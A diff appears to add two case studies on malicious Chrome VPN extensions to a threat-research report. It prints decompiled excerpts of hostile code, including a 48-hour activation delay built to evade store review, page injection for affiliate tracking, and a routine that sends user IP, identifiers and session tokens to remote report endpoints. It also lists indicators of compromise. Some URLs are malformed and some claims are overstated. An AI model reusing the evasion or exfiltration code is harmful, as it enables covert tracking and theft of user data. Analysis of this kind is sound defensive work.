@@ -19,6 +19,8 @@ All examinations were performed natively using static code review techniques and
 7. **Case Study 07: TechVPN** (Verdict: Deceptive / Advanced Decentralized C2 Resilience Layer)
 8. **Case Study 08: Stels VPN** (verdict: active threat / weaponized device-fingerprinting bot)
 9. **Case Study 09: Circuitvpn** (verdict: active threat / deceptive personal identity harvester)
+10. **Case Study 10: Troywell VPN** (verdict: active threat / overprivileged affiliate injection tracking)
+11. **Case Study 11: VPN Proxy Master (Fake clone)** (verdict: active threat / user ip and session token harvester)
 ---
 
 # 📁 Case Study 01: 无忧府超级VPN (Wuyoufu Super VPN)
@@ -587,6 +589,155 @@ the application completely avoids the modern manifest v3 optional permissions mo
 * **active network traffic relay:** `puretraffic.ru` / fornex hosting systems.
 * **primary configuration tracking keys:** `f.is_current`, `devices.remove_success`
 
+---
+
+# 📁 case study 10: troywell vpn
+
+### 📌 metadata
+* **extension name:** free vpn for chrome - troywell vpn
+* **extension id:** adlpodnneegcnbophopdmhedicjbcgco
+* **target c2 infrastructure:** troywell.org / troywell diamonds network
+* **platform:** chromium marketplace (manifest v3 architecture)
+* **status:** 🔴 active threat / overprivileged affiliate injection tracking plane
+
+### 🚨 complete required privilege expansion
+this extension enforces an aggressive platform footprint designed to capture deep data feedback logs directly across the browser interface immediately upon deployment:
+```json
+"permissions": [
+  "tabs", "webRequest", "webRequestAuthProvider", "management", "webNavigation", 
+  "storage", "alarms", "unlimitedStorage", "proxy", "notifications", "privacy", 
+  "cookies", "scripting", "declarativeNetRequest", "declarativeNetRequestWithHostAccess", 
+  "declarativeNetRequestFeedback"
+],
+"host_permissions": [ "<all_urls>" ]
+```
+
+#### technical impact:
+* **`"<all_urls>"` + `"declarativeNetRequestFeedback"`:** grants the application the structural authority to receive continuous background logs detailing which network requests are intercepted, modified, or handled across the global browser environment.
+* **`"cookies"` + `"scripting"`:** establishes programmatic access to parse local browser memory blocks, extract active user cookie strings, and inject custom tracking scripts directly into active tab interfaces.
+* **`"management"`:** monitors other active browser installations, granting the utility the capability to map or audit competing defense tools.
+
+---
+
+### 🔍 technical code deep-dive
+
+#### 1. time-delayed evasion mechanisms
+static analysis of the primary service worker initialization listeners unmasked a pre-configured time delay designed to delay the activation of their background tracking loops:
+
+```javascript
+chrome.runtime.onInstalled.addListener((function() {
+    ho(), J({ module: "caa", action: "setCaaInfo", data: { applyProgram: !0, show: !1 }, delayInMinutes: 2880 })
+}));
+```
+
+* **analysis:** the framework establishes a strict **48-hour delay window** (`2880 minutes`) before activating its contextual affiliate tracking configuration. this technique functions as an execution delay layer designed to keep the extension completely dormant during short-lived automated marketplace store review sandboxes, ensuring the tracking software bypasses automated screening layers successfully.
+
+#### 2. active tab manipulation and dom code injection
+the application utilizes global host permissions to dynamically alter the structural layout parameters of visited web pages matching target metrics strings:
+
+```javascript
+selector: "twell-caa", parentNode: document.body, stylePath: "caa/styles.css"
+window.location.href.includes(Lf) && document.head.insertAdjacentHTML("beforeend", '<meta name="'.concat(Af, '-caa-extension">'))
+```
+
+* **analysis:** the code confirms active user-traffic interception and website modification behaviors. the utility creates a custom element node container (`twell-caa`) and attaches it directly into the active layout `document.body`. it dynamically parses navigation strings to see if they match affiliate list metrics, forcefully inserting an extension tracker identifier tag (`-caa-extension`) into the page headers to link client purchase movements back to central tracking profiles.
+
+---
+
+### 🛡️ indicators of compromise (iocs)
+* **primary operational domain:** `troywell.org`
+* **active injection element signatures:** `#twell-caa`, `caa/styles.css`, `-caa-extension`
+* **internal control hooks:** `setCaaInfo`, `applyProgram`
+* **master background bundle worker:** `bg/bundle.js` (compiled vue.js framework core)
+
+---
+
+# 📁 case study 11: vpn proxy master (fake clone)
+
+### 📌 metadata
+* **extension name:** vpn proxy master: change ip for chrome
+* **extension id:** lnfdmdhmfbimhhpaeocncdlhiodoblbd
+* **target c2 infrastructure:** ://flashpull.com / 301.fastwalk.net / vpnproxymaster.com
+* **platform:** chromium marketplace (manifest v3 architecture)
+* **status:** 🔴 active threat / user ip and session token harvester
+
+### 🚨 suspicious host permission aggregation
+this extension requests a highly deceptive footprint that deliberately injects third-party traffic-steering networks directly into the required global host definitions:
+```json
+"permissions": [ "proxy", "unlimitedStorage", "notifications", "storage", "webRequest", "webRequestAuthProvider" ],
+"host_permissions": [ 
+  "https://vpnproxymaster.com*", "https://google.com*", 
+  "https://://flashpull.com/*", "http://fastwalk.net*", 
+  "https://google-analytics.com*", "*://*/*" 
+]
+```
+
+#### technical impact:
+* **`*://*/*` + `webRequest`:** secures mandatory, permanent authority to intercept and capture traffic states across every website globally without requiring runtime opt-in consent prompts.
+* **`://flashpull.com` + `301.fastwalk.net`:** grants the application explicit authority to route internal web navigation events straight through untrusted external affiliate networks and permanent redirect infrastructure layers.
+
+---
+
+### 🔍 technical code deep-dive
+
+#### 1. dynamic user ip and session token exfiltration
+static analysis of the runtime background communication scripts unmasked a persistent telemetry logging engine configured to serialize and exfiltrate raw connection profiles to ad-tech nodes:
+
+```javascript
+w = JSON.parse(window.localStorage.userInfo);
+chrome.storage.local.get(["proxyConfig", "userMessage"], (function(t) {
+    var e = t.proxyConfig.proxyConfig, r = t.userMessage;
+    var i = {
+        host: e.ip, domain: e.host,
+        user_id: "", app_uuid: w.user_id, is_vip: n,
+        country: r.geoplugin_countryCode,
+        user_ip: r.geoplugin_request,
+        protocol: o, port: u, app_type: s, app_package_name: p, app_ver: x.version, conn_time: d, network_type: v, network_name: y,
+        os_lang: window.navigator.language, os: window.navigator.platform,
+        token: b
+    };
+    Object(c.b)("https://://flashpull.com/mms/report/v1/connection", i)
+        .catch((function(t) {
+            Object(c.b)("http://fastwalk.netmms/report/v1/connection", i)
+        }));
+}));
+```
+
+* **analysis:** the code maps a clear data-harvesting process. the extension fetches the user's unencrypted personal identifier (`app_uuid`), parses response tokens to extract their real-world public network ip address (`user_ip`), isolates their physical geographic territory location (`country`), and binds it directly to active proxy session authorization tokens (`token`). it transmits these packets via background channels straight to `://flashpull.com`, deploying an unencrypted http fallback routine to `301.fastwalk.net` if the primary tracking stream is interrupted.
+
+#### 2. browser user-agent and mobile device profiling
+deep static analysis of the background utility modules uncovered specific regular expression routines designed to parse user environments and isolate mobile signatures:
+
+```javascript
+function(t, e, n) { 
+    var r = n(31); 
+    t.exports = /(?:ipad|iphone|ipod).*applewebkit/i.test(r) 
+}, 
+function(t, e, n) { 
+    var r = n(0), o = n(39), i = n(9), c = n(11), u = n(27);
+    var h = r.TypeError;
+    var v = function(t, e) { this.stopped = t, this.result = e };
+}
+```
+
+* **analysis:** the framework runs custom environment filters to parse the device's raw user-agent string text. by executing targeted regular expression verification checks (`/(?:ipad|iphone|ipod).*applewebkit/i`), the script explicitly tests if the local machine matches an ios environment. this device-profiling mechanism pipes hardware signatures directly into the `os` and `app_type` parameters of the master connection report object, segmenting user records for monetization.
+
+#### 3. systematic degradation of content security policies
+the manifest file layout outlines an aggressive content security policy configuration engineered to lower the sandboxed constraints of extension pages:
+
+```json
+"extension_pages": "default-src 'self' https://vpnproxymaster.com http://geoplugin.net https://google-analytics.com https://googletagmanager.com https://://flashpull.com http://fastwalk.net https://google.com http://google-analytics.com https://*.googleapis.com https://*.doubleclick.net https://vpnproxymaster.com; script-src 'self'; script-src-elem 'self' https://google-analytics.com; object-src 'self';"
+```
+
+* **analysis:** by explicitly whitelisting tracking nodes (`doubleclick.net`, `google-analytics.com`) and external lookup scripts (`geoplugin.net`) right beside their data-harvesting servers (`flashpull.com`), the utility opens structural holes across the application's runtime boundaries. this architecture strips away standard script isolation rules, providing unverified trackers with explicit programmatic authority to operate inside the extension context.
+
+---
+
+### 🛡️ indicators of compromise (iocs)
+* **primary exfiltration telemetry endpoints:** `https://://flashpull.com/mms/report/v1/connection`, `http://fastwalk.netmms/report/v1/connection`
+* **device-fingerprinting regex targets:** `/(?:ipad|iphone|ipod).*applewebkit/i`
+* **monitored system tokens:** `user_ip` (r.geoplugin_request), `app_uuid`, `token`, `os`, `app_type`, `country`
+* **global traffic interception flag:** `*://*/*` via web request interception handlers.
 
 
 ---
